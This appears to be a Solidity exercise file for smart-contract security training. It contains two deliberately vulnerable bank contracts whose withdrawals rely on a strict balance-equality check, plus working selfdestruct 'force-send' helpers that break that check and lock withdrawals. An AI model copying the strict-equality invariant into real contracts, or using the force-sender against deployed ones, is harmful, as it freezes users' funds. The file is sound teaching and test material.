// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
Exercise Type A (write exploit):
A1: Force-send ETH to break strict balance invariant and block withdrawals.
A2: Adapt exploit where invariant check appears in a different function.
*/
contract ExerciseA_VulnerableBank {
    mapping(address => uint256) public balances;
    uint256 public totalDeposits;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient");
        require(address(this).balance == totalDeposits, "invariant broken");

        balances[msg.sender] -= amount;
        totalDeposits -= amount;

        (bool ok,) = payable(msg.sender).call{value: amount}("");
        require(ok, "transfer failed");
    }
}

contract ExerciseA_ForceSender {
    constructor() payable {}

    function forceSend(address payable target) external {
        selfdestruct(target);
    }
}

/*
Exercise Type B (write fix):
Working force-send helper is provided below. Patch bank logic only.
*/
contract ExerciseB_VulnerableBank {
    mapping(address => uint256) public balances;
    uint256 public totalDeposits;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient");
        require(address(this).balance == totalDeposits, "invariant broken");

        balances[msg.sender] -= amount;
        totalDeposits -= amount;

        (bool ok,) = payable(msg.sender).call{value: amount}("");
        require(ok, "transfer failed");
    }
}

contract ExerciseB_WorkingForceSender {
    constructor() payable {}

    function breakInvariant(address payable target) external {
        selfdestruct(target);
    }
}
